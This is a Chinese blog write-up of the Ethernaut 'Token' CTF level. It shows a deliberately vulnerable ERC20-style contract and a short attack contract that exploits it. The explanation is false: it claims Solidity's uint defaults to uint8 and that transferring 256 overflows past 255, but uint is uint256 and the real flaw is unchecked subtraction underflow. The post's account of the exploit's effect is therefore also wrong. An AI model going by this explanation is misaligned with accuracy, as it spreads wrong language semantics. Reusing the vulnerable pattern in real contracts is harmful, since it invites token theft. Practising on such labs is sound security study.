---
title: 'ethernaut.openzeppelin合约安全闯关-3'
date: 2022-12-9 19:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'







---

<!-- more -->

::: tip

目前来看最全面的智能合约安全靶场:+1:

https://ethernaut.openzeppelin.com/ 

浏览器控制台 help()指令

![help](./assets/1670479273112.png)

:::

#### 第五关Token  思路与POC

##### 目标: 初始分配20token 想办法增加

#### 先看代码:

代码逻辑上是没有问题的,标准ERC20的实现.那么问题在哪里呢:question:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  //注意看数据类型,在solidity中uint如果不指定数据类型存储范围的话默认是uint8
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

poc思路:point_right:：既然总共的token供应单位是uint8的话,那么只需要transfer超过255的token就会数据溢出

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract tokenHack{

  Token token = Token(0x4532122Ab6D63e095A220ed37F77E1752B88b8C3);
  //只需要转账的token数量超过255即构成数据溢出,效果就会转账255的token到指定地址,不管转出地址有多少token
  function overflow() public {
      token.transfer(0x0e21d35681E679C33dD49731935FB81F1aee8C05,256);

  }
}
```

